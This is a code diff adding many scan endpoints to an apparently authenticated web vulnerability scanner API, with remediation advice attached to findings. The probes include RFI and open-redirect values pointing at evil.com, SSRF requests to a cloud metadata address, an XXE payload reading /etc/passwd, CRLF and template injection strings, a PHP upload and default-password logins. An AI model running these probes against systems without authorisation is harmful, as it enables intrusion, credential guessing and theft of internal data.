@@ -639,6 +639,356 @@ async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
 
 
 # ══════════════════════════════════════════════════════════════
+#  MISSING WEB APP SCAN ENDPOINTS
+# ══════════════════════════════════════════════════════════════
+
+def _http_get(url, timeout=10, headers=None):
+    h = {"User-Agent":"Mozilla/5.0"};
+    if headers: h.update(headers)
+    try: return _req_lib.get(url,timeout=timeout,verify=False,headers=h,allow_redirects=True)
+    except: return None
+
+@app.post("/api/scan/wafw00f")
+async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
+    result = await run_tool(["wafw00f", req.target, "-a"], timeout=60)
+    out = result.get("output","")
+    detected = re.findall(r"is behind (.+?)(?:\n|$|WAF)", out, re.IGNORECASE)
+    waf = detected[0].strip() if detected else None
+    findings = [{"detail":f"WAF detected: {waf}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"WAF","owasp":"N/A","remediation":"WAF is a defensive control."}] if waf else []
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"wafw00f",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"wafw00f","waf":waf,"detected":bool(waf),"findings":findings,"output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/whatweb")
+async def scan_whatweb(req: ScanRequest, user=Depends(verify_token)):
+    result = await run_tool(["whatweb","--color=never","--log-verbose=-",req.target], timeout=60)
+    out = result.get("output","")
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"whatweb",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/nmap")
+async def scan_nmap(req: ScanRequest, user=Depends(verify_token)):
+    host = req.target.replace("http://","").replace("https://","").split("/")[0]
+    result = await run_tool(["nmap","-sV","-T4","--open","--top-ports","100",host], timeout=120)
+    out = result.get("output","")
+    ports = []
+    for line in out.splitlines():
+        m = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", line.strip())
+        if m: ports.append({"port":int(m.group(1)),"proto":m.group(2),"state":"open","service":m.group(3),"version":m.group(4).strip()})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"nmap",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"nmap","ports":ports,"total_open":len(ports),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/cors")
+async def scan_cors(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    try:
+        r = _req_lib.get(req.target,timeout=10,verify=False,headers={"User-Agent":"Mozilla/5.0","Origin":"https://evil.com"},allow_redirects=True)
+        acao = r.headers.get("Access-Control-Allow-Origin","")
+        acac = r.headers.get("Access-Control-Allow-Credentials","")
+        if acao in ("*","https://evil.com"):
+            vulnerable = True
+            findings.append({"detail":f"CORS: Access-Control-Allow-Origin: {acao}","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-942","cwe_name":"CORS Misconfiguration","owasp":"A05:2021","remediation":"Restrict CORS to trusted origins only."})
+        if acac.lower()=="true" and acao!="":
+            vulnerable = True
+            findings.append({"detail":"CORS: Credentials allowed with permissive origin","severity":"CRITICAL","cvss":"9.0","cve":"N/A","cwe":"CWE-942","cwe_name":"CORS Misconfiguration","owasp":"A05:2021","remediation":"Never combine Access-Control-Allow-Credentials: true with wildcard origins."})
+    except Exception as e:
+        findings.append({"detail":f"CORS scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"cors",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"cors","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/gobuster")
+async def scan_gobuster(req: ScanRequest, user=Depends(verify_token)):
+    result = await run_tool(["gobuster","dir","-u",req.target,"-w","/usr/share/wordlists/dirb/common.txt","-t","20","--no-error","-q"], timeout=120)
+    out = result.get("output","")
+    discovered = [line.split()[0] for line in out.splitlines() if line.strip().startswith("/")]
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"gobuster",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"gobuster","discovered":discovered,"total":len(discovered),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/subdomains")
+async def scan_subdomains(req: ScanRequest, user=Depends(verify_token)):
+    host = req.target.replace("http://","").replace("https://","").split("/")[0]
+    result = await run_tool(["amass","enum","-passive","-d",host,"-timeout","2"], timeout=120)
+    out = result.get("output","")
+    subdomains = list(set(re.findall(r"[\w\-\.]+\."+re.escape(host), out)))
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"subdomains",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"subdomains","subdomains":subdomains,"total":len(subdomains),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/dns")
+async def scan_dns(req: ScanRequest, user=Depends(verify_token)):
+    host = req.target.replace("http://","").replace("https://","").split("/")[0]
+    result = await run_tool(["dig","any",host,"+noall","+answer"], timeout=30)
+    out = result.get("output","")
+    records = {}
+    for line in out.splitlines():
+        parts = line.split()
+        if len(parts)>=5 and not line.startswith(";"):
+            rtype = parts[3]; val = " ".join(parts[4:])
+            records.setdefault(rtype,[]).append(val)
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"dns",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"dns","records":records,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/ffuf")
+async def scan_ffuf(req: ScanRequest, user=Depends(verify_token)):
+    url = req.target.rstrip("/") + "/FUZZ"
+    result = await run_tool(["ffuf","-u",url,"-w","/usr/share/wordlists/dirb/common.txt","-mc","200,201,301,302,403","-t","20","-s"], timeout=120)
+    out = result.get("output","")
+    discovered = [line.strip() for line in out.splitlines() if line.strip() and not line.startswith("[")]
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ffuf",req.target,result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"ffuf","discovered":discovered,"total":len(discovered),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/rfi")
+async def scan_rfi(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    test_payloads = ["?page=http://evil.com/shell.txt","?file=http://evil.com/","?include=http://evil.com/","?url=http://evil.com/"]
+    for p in test_payloads[:2]:
+        r = _http_get(req.target+p, timeout=8)
+        if r and ("evil.com" in r.text or r.status_code==200 and len(r.text)>100):
+            findings.append({"detail":f"Potential RFI via param: {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-98","cwe_name":"Remote File Inclusion","owasp":"A03:2021","remediation":"Disable allow_url_include in PHP. Validate all file path inputs."})
+            vulnerable = True; break
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"rfi",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"rfi","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/deserial")
+async def scan_deserial(req: ScanRequest, user=Depends(verify_token)):
+    findings = []
+    r = _http_get(req.target, timeout=10)
+    if r:
+        ct = r.headers.get("Content-Type","")
+        if "java" in ct.lower() or "application/x-java-serialized-object" in ct.lower():
+            findings.append({"detail":"Java serialization content-type detected","severity":"HIGH","cvss":"8.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Deserialization","owasp":"A08:2021","remediation":"Avoid deserializing untrusted data. Use safe parsers."})
+        cookies = r.headers.get("Set-Cookie","")
+        if "serialize" in cookies.lower() or "base64" in cookies.lower() or "rO0" in cookies:
+            findings.append({"detail":"Possible serialized object in cookie","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-502","cwe_name":"Deserialization","owasp":"A08:2021","remediation":"Sign and validate all serialized session data."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"deserial",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"deserial","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/smuggling")
+async def scan_smuggling(req: ScanRequest, user=Depends(verify_token)):
+    findings = []
+    result = await run_tool(["curl","-s","-I","--http1.1","-H","Transfer-Encoding: chunked","-H","Content-Length: 4",req.target], timeout=15)
+    out = result.get("output","")
+    if "400" not in out and "501" not in out and out.strip():
+        findings.append({"detail":"Server may accept conflicting Transfer-Encoding/Content-Length headers","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-444","cwe_name":"HTTP Request Smuggling","owasp":"A02:2021","remediation":"Use HTTP/2 end-to-end. Ensure consistent TE handling."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"smuggling",req.target,{"output":out})
+    return {"scan_id":scan_id,"target":req.target,"tool":"smuggling","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/responsesplitting")
+async def scan_responsesplitting(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    test = req.target + "?q=%0d%0aSet-Cookie:injected=1"
+    r = _http_get(test, timeout=10)
+    if r and "injected" in str(r.headers):
+        vulnerable = True
+        findings.append({"detail":"HTTP Response Splitting via CRLF injection","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-113","cwe_name":"HTTP Response Splitting","owasp":"A03:2021","remediation":"Strip CR/LF from all user-controlled values used in headers."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"responsesplitting",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"responsesplitting","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/sessionfixation")
+async def scan_sessionfixation(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    r = _http_get(req.target, timeout=10)
+    if r:
+        sc = r.headers.get("Set-Cookie","")
+        if "httponly" not in sc.lower():
+            findings.append({"detail":"Session cookie missing HttpOnly flag","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-384","cwe_name":"Session Fixation","owasp":"A07:2021","remediation":"Set HttpOnly and Secure flags on all session cookies."})
+            vulnerable = True
+        if "samesite" not in sc.lower():
+            findings.append({"detail":"Session cookie missing SameSite attribute","severity":"LOW","cvss":"3.5","cve":"N/A","cwe":"CWE-384","cwe_name":"Session Fixation","owasp":"A07:2021","remediation":"Add SameSite=Strict or SameSite=Lax to session cookies."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"sessionfixation",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"sessionfixation","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/openredirect")
+async def scan_openredirect(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    payloads = ["?url=https://evil.com","?redirect=https://evil.com","?next=https://evil.com","?return=https://evil.com","?to=https://evil.com"]
+    for p in payloads:
+        try:
+            r = _req_lib.get(req.target+p,timeout=8,verify=False,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=False)
+            loc = r.headers.get("Location","")
+            if "evil.com" in loc:
+                vulnerable = True
+                findings.append({"detail":f"Open Redirect via {p} → {loc}","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-601","cwe_name":"Open Redirect","owasp":"A01:2021","remediation":"Whitelist allowed redirect destinations. Never redirect to user-supplied URLs."})
+                break
+        except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"openredirect",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"openredirect","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/sensitivefiles")
+async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; base = req.target.rstrip("/")
+    paths = [".env","config.php","wp-config.php",".git/HEAD","backup.zip","db.sql","admin/","phpinfo.php",".htpasswd","web.config","server-status","robots.txt","sitemap.xml","/.well-known/security.txt","crossdomain.xml","clientaccesspolicy.xml"]
+    for p in paths:
+        r = _http_get(f"{base}/{p}", timeout=6)
+        if r and r.status_code in (200,403):
+            sev = "HIGH" if any(x in p for x in [".env","config.php","wp-config",".git","backup","db.sql",".htpasswd","web.config"]) else "LOW"
+            findings.append({"detail":f"Accessible: /{p} (HTTP {r.status_code})","severity":sev,"cvss":"7.5" if sev=="HIGH" else "3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Block access to /{p} via server config or .htaccess."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"sensitivefiles",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"sensitivefiles","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/hydra")
+async def scan_hydra(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    weak_creds = [("admin","admin"),("admin","password"),("admin","123456"),("root","root"),("test","test")]
+    login_url = req.target.rstrip("/") + "/login"
+    for u,p in weak_creds:
+        try:
+            r = _req_lib.post(login_url,data={"username":u,"password":p},timeout=8,verify=False,allow_redirects=True)
+            if r.status_code==200 and ("logout" in r.text.lower() or "dashboard" in r.text.lower() or "welcome" in r.text.lower()):
+                vulnerable = True
+                findings.append({"detail":f"Weak credentials accepted: {u}/{p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-521","cwe_name":"Weak Password","owasp":"A07:2021","remediation":"Enforce strong password policy and account lockout."})
+                break
+        except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"hydra",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"hydra","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/ssrf")
+async def scan_ssrf(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    payloads = ["?url=http://169.254.169.254/latest/meta-data/","?target=http://169.254.169.254/","?fetch=http://127.0.0.1/","?proxy=http://localhost/"]
+    for p in payloads:
+        try:
+            r = _req_lib.get(req.target+p,timeout=8,verify=False,headers={"User-Agent":"Mozilla/5.0"})
+            if r.status_code==200 and any(x in r.text for x in ["ami-id","instance-id","local-ipv4","root:x"]):
+                vulnerable = True
+                findings.append({"detail":f"SSRF: Internal resource accessible via {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-918","cwe_name":"SSRF","owasp":"A10:2021","remediation":"Whitelist allowed URLs. Block requests to internal/private IPs."})
+                break
+        except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssrf",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"ssrf","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/xxe")
+async def scan_xxe(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    try:
+        r = _req_lib.post(req.target,data=xxe_payload,timeout=10,verify=False,headers={"Content-Type":"application/xml","User-Agent":"Mozilla/5.0"})
+        if "root:x" in r.text or "nobody:x" in r.text:
+            vulnerable = True
+            findings.append({"detail":"XXE: /etc/passwd contents returned in response","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611","cwe_name":"XXE Injection","owasp":"A05:2021","remediation":"Disable external entity processing in XML parser. Use JSON where possible."})
+    except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"xxe",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"xxe","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/clickjacking")
+async def scan_clickjacking(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    r = _http_get(req.target, timeout=10)
+    if r:
+        xfo = r.headers.get("X-Frame-Options","")
+        csp = r.headers.get("Content-Security-Policy","")
+        if not xfo and "frame-ancestors" not in csp.lower():
+            vulnerable = True
+            findings.append({"detail":"Missing X-Frame-Options and CSP frame-ancestors — page can be framed","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Add X-Frame-Options: DENY or CSP frame-ancestors 'none'."})
+        elif xfo.lower() == "sameorigin":
+            findings.append({"detail":"X-Frame-Options: SAMEORIGIN — only same-origin framing blocked","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Consider X-Frame-Options: DENY for stronger protection."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/verbtamper")
+async def scan_verbtamper(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    try:
+        r = _req_lib.options(req.target,timeout=10,verify=False,headers={"User-Agent":"Mozilla/5.0"})
+        allow = r.headers.get("Allow","")
+        dangerous = [m for m in ["PUT","DELETE","TRACE","CONNECT","PATCH"] if m in allow]
+        if dangerous:
+            vulnerable = True
+            findings.append({"detail":f"Dangerous HTTP methods allowed: {', '.join(dangerous)}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-650","cwe_name":"HTTP Verb Tampering","owasp":"A05:2021","remediation":f"Disable methods: {', '.join(dangerous)} in server config."})
+    except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"verbtamper",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"verbtamper","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/pollution")
+async def scan_pollution(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    try:
+        r1 = _req_lib.get(req.target+"?id=1",timeout=8,verify=False,headers={"User-Agent":"Mozilla/5.0"})
+        r2 = _req_lib.get(req.target+"?id=1&id=2",timeout=8,verify=False,headers={"User-Agent":"Mozilla/5.0"})
+        if r1 and r2 and r1.text != r2.text:
+            vulnerable = True
+            findings.append({"detail":"HTTP Parameter Pollution: duplicate param changes response","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-235","cwe_name":"Parameter Pollution","owasp":"A03:2021","remediation":"Validate and deduplicate all query parameters server-side."})
+    except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"pollution",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"pollution","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/idor")
+async def scan_idor(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    id_paths = ["/user/1","/user/2","/account/1","/profile/1","/api/user/1","/admin/user/1"]
+    for p in id_paths:
+        r = _http_get(req.target.rstrip("/")+p, timeout=8)
+        if r and r.status_code==200 and len(r.text)>50:
+            vulnerable = True
+            findings.append({"detail":f"IDOR: {p} accessible without auth check (HTTP 200)","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-639","cwe_name":"IDOR","owasp":"A01:2021","remediation":"Implement object-level authorization checks on every endpoint."})
+            break
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"idor",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"idor","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/ssti")
+async def scan_ssti(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    payloads = [("?name={{7*7}}","49"),("?q={{7*7}}","49"),("?search=#{7*7}","49")]
+    for param,expected in payloads:
+        r = _http_get(req.target+param, timeout=8)
+        if r and expected in r.text:
+            vulnerable = True
+            findings.append({"detail":f"SSTI: Template expression evaluated — {param} returned '{expected}'","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-1336","cwe_name":"SSTI","owasp":"A03:2021","remediation":"Never render user input as a template. Use safe output encoding."})
+            break
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssti",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"ssti","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/fileupload")
+async def scan_fileupload(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    upload_paths = ["/upload","/file-upload","/upload.php","/api/upload","/admin/upload"]
+    for p in upload_paths:
+        try:
+            url = req.target.rstrip("/")+p
+            r = _req_lib.post(url,files={"file":("shell.php",b"<?php echo 'test'; ?>","application/x-php")},timeout=8,verify=False)
+            if r.status_code in (200,201) and ("success" in r.text.lower() or "upload" in r.text.lower()):
+                vulnerable = True
+                findings.append({"detail":f"File upload endpoint {p} accepts PHP files","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-434","cwe_name":"Unrestricted File Upload","owasp":"A04:2021","remediation":"Whitelist allowed file types. Store uploads outside webroot. Rename files."})
+                break
+        except: pass
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"fileupload",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"fileupload","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/dataexfil")
+async def scan_dataexfil(req: ScanRequest, user=Depends(verify_token)):
+    findings = []
+    r = _http_get(req.target, timeout=10)
+    if r:
+        patterns = [(r"\b\d{16}\b","Credit card number pattern"),
+                    (r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b","Email address exposed"),
+                    (r"\b(?:password|passwd|pwd)\s*[:=]\s*\S+","Password in response"),
+                    (r"\b(?:api[_-]?key|apikey|secret|token)\s*[:=]\s*\S+","API key/secret exposed")]
+        for pattern, desc in patterns:
+            if re.search(pattern, r.text, re.IGNORECASE):
+                findings.append({"detail":desc,"severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-200","cwe_name":"Data Exposure","owasp":"A02:2021","remediation":"Remove sensitive data from HTTP responses."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"dataexfil",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"dataexfil","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/scan/racecondition")
+async def scan_racecondition(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; responses = []
+    try:
+        import concurrent.futures
+        def _fetch(i):
+            try:
+                r = _req_lib.get(req.target,timeout=5,verify=False,headers={"User-Agent":"Mozilla/5.0"})
+                return r.status_code
+            except: return 0
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+            responses = list(ex.map(_fetch, range(10)))
+        unique = set(responses) - {0}
+        if len(unique) > 1:
+            findings.append({"detail":f"Race condition: inconsistent responses {unique} across 10 concurrent requests","severity":"MEDIUM","cvss":"6.8","cve":"N/A","cwe":"CWE-362","cwe_name":"Race Condition","owasp":"A04:2021","remediation":"Implement proper locking and atomic transactions for shared resources."})
+    except Exception as e:
+        findings.append({"detail":f"Race condition test error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"racecondition",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"racecondition","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+# ══════════════════════════════════════════════════════════════
 #  BUFFER OVERFLOW MODULE
 # ══════════════════════════════════════════════════════════════
 
